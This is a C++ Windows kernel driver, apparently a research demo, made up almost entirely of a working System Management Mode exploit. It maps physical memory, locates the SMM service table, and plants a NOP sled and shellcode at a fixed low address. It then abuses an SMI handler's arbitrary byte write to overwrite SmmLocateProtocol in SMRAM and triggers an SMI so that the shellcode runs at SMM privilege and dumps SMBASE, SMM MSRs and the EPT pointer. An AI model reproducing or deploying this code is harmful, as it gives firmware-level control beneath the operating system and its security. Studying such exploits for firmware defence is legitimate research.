#include <ntddk.h>
#include <ntstrsafe.h>
#include <ntintsafe.h>
#include <intrin.h>


#ifndef Add2Ptr
#define Add2Ptr(P,I) ((PVOID)((PUCHAR)(P) + (I)))
#endif

static const ULONG k_PoolTag = 'OMED';

#define DEMO_INFO(Format, ...) \
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, \
               DPFLTR_ERROR_LEVEL, \
               "[+] %s: " Format "\n", \
               __FUNCTION__, \
               __VA_ARGS__)

#define DEMO_ERROR(Format, ...) \
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, \
               DPFLTR_ERROR_LEVEL, \
               "[-] %s: " Format "\n", \
               __FUNCTION__, \
               __VA_ARGS__)

//
// UEFI
//
#define EFIAPI __cdecl
typedef UINT64 UINTN;
typedef UINTN RETURN_STATUS;
typedef RETURN_STATUS EFI_STATUS;
typedef GUID EFI_GUID;
///
/// The function was not performed due to a security violation.
///
#define EFI_SECURITY_VIOLATION    (0x8000000000000000ULL | 26)


HANDLE g_SectionHandle;

static
NTSTATUS
IninitializeSection ()
{
    static const UNICODE_STRING deviceName =
        RTL_CONSTANT_STRING(L"\\Device\\PhysicalMemory");
    static const OBJECT_ATTRIBUTES attributes =
        RTL_CONSTANT_OBJECT_ATTRIBUTES(&deviceName,
                                       OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE);
    NTSTATUS status;
    HANDLE sectionHandle;

    status = ZwOpenSection(&sectionHandle, SECTION_ALL_ACCESS, const_cast<POBJECT_ATTRIBUTES>(&attributes));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ZwOpenSection failed : %08x", status);
        goto Exit;
    }

    g_SectionHandle = sectionHandle;

Exit:
    return status;
}


static
NTSTATUS
ReadFromPhysicalMemory (
    HANDLE SectionHandle,
    PVOID Buffer,
    ULONG64 SourceAddress,
    SIZE_T BytesToRead
    )
{
    NTSTATUS status;
    PVOID virtualAddress;
    LARGE_INTEGER physicalAddress;
    SIZE_T viewSize;

    virtualAddress = nullptr;

    viewSize = BytesToRead;
    physicalAddress.QuadPart = SourceAddress;
    status = ZwMapViewOfSection(SectionHandle,
                                ZwCurrentProcess(),
                                &virtualAddress,
                                0,
                                BytesToRead,
                                &physicalAddress,
                                &viewSize,
                                ViewUnmap,
                                0,
                                PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ZwMapViewOfSection failed : %08x", status);
        goto Exit;
    }

    RtlCopyMemory(Buffer, Add2Ptr(virtualAddress, (SourceAddress & 0xfff)), BytesToRead);

Exit:
    if (virtualAddress != nullptr)
    {
        ZwUnmapViewOfSection(ZwCurrentProcess(), virtualAddress);
    }
    return status;
}

static
NTSTATUS
WriteToPhysicalMemory (
    HANDLE SectionHandle,
    ULONG64 DestinationAddress,
    PVOID Buffer,
    SIZE_T BytesToWrite
    )
{
    NTSTATUS status;
    PVOID virtualAddress;
    LARGE_INTEGER physicalAddress;
    SIZE_T viewSize;

    virtualAddress = nullptr;

    viewSize = BytesToWrite;
    physicalAddress.QuadPart = DestinationAddress;
    status = ZwMapViewOfSection(SectionHandle,
                                ZwCurrentProcess(),
                                &virtualAddress,
                                0,
                                BytesToWrite,
                                &physicalAddress,
                                &viewSize,
                                ViewUnmap,
                                0,
                                PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ZwMapViewOfSection failed : %08x", status);
        goto Exit;
    }

    RtlCopyMemory(Add2Ptr(virtualAddress, (DestinationAddress & 0xfff)), Buffer, BytesToWrite);

Exit:
    if (virtualAddress != nullptr)
    {
        ZwUnmapViewOfSection(ZwCurrentProcess(), virtualAddress);
    }
    return status;
}



#pragma region place shell code

struct HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK
{
    ULONG64 SmmFeatureControl;          // MSR_SMM_FEATURE_CONTROL (4e0h)
    ULONG64 SmmMcaCap; // MSR_SMM_MCA_CAP (17dh)
    ULONG64 Eptp;        // Value of EPTP VM-execution control field 7ED8h
    ULONG64 Smbase;    // IA32_SMBASE (9eh)
};



//#pragma optimize("", off)
//#pragma check_stack(off)
//#pragma runtime_checks("", off)
//
//#pragma runtime_checks("", restore)
//#pragma check_stack()
//#pragma optimize("", on)

/*
typedef
EFI_STATUS
(EFIAPI *EFI_LOCATE_PROTOCOL)(
  IN  EFI_GUID  *Protocol,
  IN  VOID      *Registration, OPTIONAL
  OUT VOID      **Interface
  );
*/
static
EFI_STATUS
EFIAPI
HookedSmmLocateProtocol (
    EFI_GUID* Protocol,
    PVOID Registration,
    PVOID* Interface
    )
{
    HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK* block;

    UNREFERENCED_PARAMETER(Protocol);
    UNREFERENCED_PARAMETER(Registration);
    UNREFERENCED_PARAMETER(Interface);

    block = static_cast<HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK*>(nullptr);

    block->Smbase = __readmsr(0x9e);
    block->SmmFeatureControl = __readmsr(0x4e0);
    block->SmmMcaCap = __readmsr(0x17d);
    // Setting of “enable EPT” VM-execution control
    if ((*static_cast<PULONG32>(Add2Ptr(block->Smbase, 0x8000 + 0x7EE0)) & 1) == 1)
    {
        block->Eptp = *static_cast<PULONG64>(Add2Ptr(block->Smbase, 0x8000 + 0x7ED8));
    }
    else
    {
        block->Eptp = MAXULONG64;
    }

    return EFI_SECURITY_VIOLATION;
}

static void HookedSmmLocateProtocolZZZ() {}

static PVOID g_OriginalCode;

static const ULONG64 shellCodeEntryPoint = 0x07070707;
static const ULONG64 shellCodeAddress = 0x07070710;
static const SIZE_T nopSledSize = shellCodeAddress - shellCodeEntryPoint;


static
NTSTATUS
RestoreOriginalCode ()
{
static const SIZE_T functionSize = reinterpret_cast<ULONG64>(HookedSmmLocateProtocolZZZ) - reinterpret_cast<ULONG64>(HookedSmmLocateProtocol);
static const SIZE_T shellCodeSize = nopSledSize + functionSize;
    NTSTATUS status;

    status = WriteToPhysicalMemory(g_SectionHandle, shellCodeEntryPoint, g_OriginalCode, shellCodeSize);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("MmCopyMemory failed : %08x", status);
        goto Exit;
    }
    ExFreePoolWithTag(g_OriginalCode, k_PoolTag);

Exit:
    return status;
}

static
NTSTATUS
PlaceShellCode (

    )
{
static const SIZE_T functionSize = reinterpret_cast<ULONG64>(HookedSmmLocateProtocolZZZ) - reinterpret_cast<ULONG64>(HookedSmmLocateProtocol);
static const SIZE_T shellCodeSize = nopSledSize + functionSize;
    NTSTATUS status;

    auto originalCode = ExAllocatePoolWithTag(NonPagedPoolNx, shellCodeSize, k_PoolTag);
    if (originalCode == nullptr)
    {
        status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }
    g_OriginalCode = originalCode;

    SIZE_T numberOfBytesTransferred;
    MM_COPY_ADDRESS sourceAddress;
    sourceAddress.PhysicalAddress.QuadPart = shellCodeEntryPoint;
    status = MmCopyMemory(originalCode, sourceAddress, shellCodeSize, MM_COPY_MEMORY_PHYSICAL, &numberOfBytesTransferred);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("MmCopyMemory failed : %08x", status);
        goto Exit;
    }

    UCHAR nops[nopSledSize];
    RtlFillMemory(nops, sizeof(nops), 0x90);
    //nops[0] = 0xf1;
    status = WriteToPhysicalMemory(g_SectionHandle, shellCodeEntryPoint, nops, sizeof(nops));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("MmCopyMemory failed : %08x", status);
        goto Exit;
    }

    status = WriteToPhysicalMemory(g_SectionHandle, shellCodeAddress, reinterpret_cast<PVOID>(HookedSmmLocateProtocol), functionSize);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("MmCopyMemory failed : %08x", status);
        goto Exit;
    }

    //__wbinvd();

Exit:
    return status;
}

#pragma endregion


#pragma region patch SmmLocateProtocol

EXTERN_C
void* MemMem(
    __in const void* SearchBase,
    __in SIZE_T SearchSize,
    __in const void* Pattern,
    __in SIZE_T PatternSize)
{
    ASSERT(SearchBase);
    ASSERT(SearchSize);
    ASSERT(Pattern);
    ASSERT(PatternSize);

    if (PatternSize > SearchSize)
    {
        return nullptr;
    }
    auto searchBase = static_cast<const char*>(SearchBase);
    for (size_t i = 0; i <= SearchSize - PatternSize; i += 8)
    {
        if (!memcmp(Pattern, &searchBase[i], PatternSize))
        {
            return const_cast<char*>(&searchBase[i]);
        }
    }
    return nullptr;
}

static
NTSTATUS
LoadLoaderReservedRawData (
    PULONG64 FoundAddress
    )
{
    static UNICODE_STRING key =
        RTL_CONSTANT_STRING(L"\\REGISTRY\\MACHINE\\HARDWARE\\RESOURCEMAP\\System Resources\\Loader Reserved");
    static OBJECT_ATTRIBUTES attributes =
        RTL_CONSTANT_OBJECT_ATTRIBUTES(&key, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE);

    NTSTATUS status;
    HANDLE keyHandle;
    PKEY_VALUE_FULL_INFORMATION buffer;
    PVOID scanBuffer;

    *FoundAddress = 0;
    buffer = nullptr;
    scanBuffer = nullptr;

    status = ZwOpenKey(&keyHandle, KEY_ALL_ACCESS, &attributes);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("SetWriteDestination failed : %08x", status);
        goto Exit;
    }

    buffer = static_cast<PKEY_VALUE_FULL_INFORMATION>(
        ExAllocatePoolWithTag(PagedPool, PAGE_SIZE, k_PoolTag));
    if (buffer == nullptr)
    {
        DEMO_ERROR("ExAllocatePoolWithTag failed");
        status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }

    static UNICODE_STRING valueName = RTL_CONSTANT_STRING(L".Raw");
    ULONG ResultLength;
    status = ZwQueryValueKey(keyHandle,
                             &valueName,
                             KeyValueFullInformation,
                             buffer,
                             PAGE_SIZE,
                             &ResultLength);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ZwQueryValueKey failed : %08x", status);
        goto Exit;
    }

    scanBuffer = ExAllocatePoolWithTag(PagedPool, PAGE_SIZE, k_PoolTag);
    if (scanBuffer == nullptr)
    {
        DEMO_ERROR("ExAllocatePoolWithTag failed");
        status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }


    CM_RESOURCE_LIST* list;
    list = reinterpret_cast<CM_RESOURCE_LIST*>(Add2Ptr(buffer, buffer->DataOffset));

    for (ULONG64 i = 0; i < list->Count; ++i)
    {
        PCM_FULL_RESOURCE_DESCRIPTOR fullDescriptor;

        fullDescriptor = &list->List[i];
        for (ULONG64 j = 0; j < fullDescriptor->PartialResourceList.Count; ++j)
        {
            PCM_PARTIAL_RESOURCE_DESCRIPTOR partial;

            partial = &fullDescriptor->PartialResourceList.PartialDescriptors[j];
            if ((partial->Type != CmResourceTypeMemory) ||
                (partial->Flags != CM_RESOURCE_PORT_MEMORY))
            {
                DEMO_ERROR("Unexpected entry");
                continue;
            }

            if ((partial->u.Memory.Start.QuadPart < 0x80000000) ||
                (partial->u.Memory.Start.QuadPart >= 0x88000000))
            {
                continue;
            }

            //DEMO_INFO("Scanning 0x%llx - 0x%llx",
            //           partial->u.Memory.Start.QuadPart,
            //           partial->u.Memory.Start.QuadPart + partial->u.Memory.Length);

            for (ULONG64 offset = 0; offset < partial->u.Memory.Length; offset += PAGE_SIZE)
            {
                status = ReadFromPhysicalMemory(g_SectionHandle, scanBuffer,
                                                partial->u.Memory.Start.QuadPart + offset,
                                                PAGE_SIZE);
                if (!NT_SUCCESS(status))
                {
                    DEMO_ERROR("ReadFromPhysicalMemory failed : %08x", status);
                    continue;
                }

                ULONG64 pattern = 'cmms';
                PVOID found = MemMem(scanBuffer, PAGE_SIZE, &pattern, sizeof(pattern));
                if (found )
                {
                    ULONG64 offsetInPage = reinterpret_cast<ULONG64>(found) - reinterpret_cast<ULONG64>(scanBuffer);
                    *FoundAddress = partial->u.Memory.Start.QuadPart + offset + offsetInPage;
                    goto Exit;
                }
            }
        }
    }

    status = STATUS_NOT_FOUND;

Exit:
    if (*FoundAddress != 0)
    {
        status = STATUS_SUCCESS;
    }

    if (scanBuffer != nullptr)
    {
        ExFreePoolWithTag(scanBuffer, k_PoolTag);
    }
    if (buffer != nullptr)
    {
        ExFreePoolWithTag(buffer, k_PoolTag);
    }
    if (keyHandle != nullptr)
    {
        ZwClose(keyHandle);
    }
    return status;
}

static
NTSTATUS
FindSystemManagementServiceTable (
    PPHYSICAL_ADDRESS TableAddress
    )
{
    //static const ULONG64 SMM_CORE_PRIVATE_DATA = 0x87F1B390;
    //static const PULONG64 addressOfSmstField = static const ULONG64 + 0x30;   // Smst
    //TableAddress->QuadPart = 0x887fa710;
    NTSTATUS status;
    ULONG64 found;

    status = LoadLoaderReservedRawData(&found);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("LoadLoaderReservedRawData failed : %08x", status);
        goto Exit;
    }

    DEMO_INFO("SMM core found at 0x%llx in RT Code", found);

    status = ReadFromPhysicalMemory(g_SectionHandle, &TableAddress->QuadPart, found  + 0x30, sizeof(TableAddress->QuadPart));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ReadFromPhysicalMemory failed : %08x", status);
        goto Exit;
    }

    DEMO_INFO("SMST found at 0x%llx in SMRAM", TableAddress->QuadPart);

Exit:
    return status;
}

static
NTSTATUS
SetSmmWriteDestination (
    PHYSICAL_ADDRESS Destionation
    )
{
    Destionation.QuadPart -= 2;
    return WriteToPhysicalMemory(g_SectionHandle, 0x104, &Destionation.QuadPart, sizeof(Destionation.QuadPart));
}

static
void
ExecuteWrite07WithSmm (
    )
{
    __outbyte(0xb2, 0x40);
}

static
NTSTATUS
WriteWithSmm (
    PHYSICAL_ADDRESS Address
    )
{
    NTSTATUS status;

    for (ULONG64 offset = 0; offset < 4; ++offset)
    {
        status = SetSmmWriteDestination(Address);
        if (!NT_SUCCESS(status))
        {
            DEMO_ERROR("SetWriteDestination failed : %08x", status);
            goto Exit;
        }
        ExecuteWrite07WithSmm();

        Address.QuadPart++;
    }

Exit:
    return status;
}

static
NTSTATUS
PatchSmstSmmLocateProtocolAddress (
    )
{
    NTSTATUS status;
    PHYSICAL_ADDRESS addressOfSmst;
    PHYSICAL_ADDRESS addressOfSmmLocateProtocolField;

    status = FindSystemManagementServiceTable(&addressOfSmst);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("FindSystemManagementServiceTable failed : %08x", status);
        goto Exit;
    }

    addressOfSmmLocateProtocolField.QuadPart = addressOfSmst.QuadPart + 0xd0;
    status = WriteWithSmm(addressOfSmmLocateProtocolField);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("FindSystemManagementServiceTable failed : %08x", status);
        goto Exit;
    }

Exit:
    return status;
}

#pragma endregion

#pragma region execute shell code


/*
typedef
EFI_STATUS
(EFIAPI *EFI_LOCATE_PROTOCOL)(
  IN  EFI_GUID  *Protocol,
  IN  VOID      *Registration, OPTIONAL
  OUT VOID      **Interface
  );
*/
static

NTSTATUS
ExecuteShellCode (
    )
{
    __outbyte(0xb2, 0xdf);  // OA3_SMM
    return STATUS_SUCCESS;
}

#pragma endregion

#pragma region verify exploitation

static
NTSTATUS
DumpSmmExploitOuput (
    )
{
    NTSTATUS status;
    HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK block;

    status = ReadFromPhysicalMemory(g_SectionHandle, &block, 0, sizeof(block));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ReadFromPhysicalMemory failed : %08x", status);
        goto Exit;
    }

    if (block.Smbase == 0)
    {
        DEMO_ERROR("Shell code did not run??");
        status = STATUS_UNSUCCESSFUL;
        goto Exit;
    }

    DEMO_INFO("IA32_SMBASE             = 0x%llx", block.Smbase);
    DEMO_INFO("MSR_SMM_FEATURE_CONTROL = 0x%llx", block.SmmFeatureControl);
    DEMO_INFO("MSR_SMM_MCA_CAP         = 0x%llx", block.SmmMcaCap);
    if (block.Eptp == MAXULONG64)
    {
        DEMO_INFO("EPT pointer             = Not available");
    }
    else
    {
        DEMO_INFO("EPT pointer             = 0x%llx", block.Eptp);
    }

Exit:
    return status;
}

#pragma endregion

static
NTSTATUS
ExploitSmm (
    )
{
    NTSTATUS status;

    if (KdDebuggerNotPresent == FALSE)
    {
        KdBreakPoint();
    }

    status = IninitializeSection();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("IninitializeSection failed : %08x", status);
        goto Exit;
    }

    status = PlaceShellCode();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("PlaceShellCode failed : %08x", status);
        goto Exit;
    }
    DEMO_INFO("Placed SMM shell code");

    status = PatchSmstSmmLocateProtocolAddress();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("PatchSmstSmmLocateProtocolAddress failed : %08x", status);
        goto Exit;
    }
    DEMO_INFO("Patched SMST->SmmLocateProtocol in SMRAM");

    status = ExecuteShellCode();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ExecuteShellCode failed : %08x", status);
        goto Exit;
    }

    DEMO_INFO("Triggered SMM exploit");
    RestoreOriginalCode();

    status = DumpSmmExploitOuput();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("VerifyExploitation failed : %08x", status);
        goto Exit;
    }

    DEMO_INFO("Successfully executed shell code in SMM. Failing DriverEntry to unload itself");

Exit:
    if (g_SectionHandle != nullptr)
    {
        ZwClose(g_SectionHandle);
    }
    return status;
}

EXTERN_C
NTSTATUS
DriverEntry (
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath
    )
{
    NTSTATUS status;

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    status = ExploitSmm();
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("ExploitSmm failed : %08x", status);
        goto Exit;
    }

    status = STATUS_CANCELLED;

Exit:
    return status;
}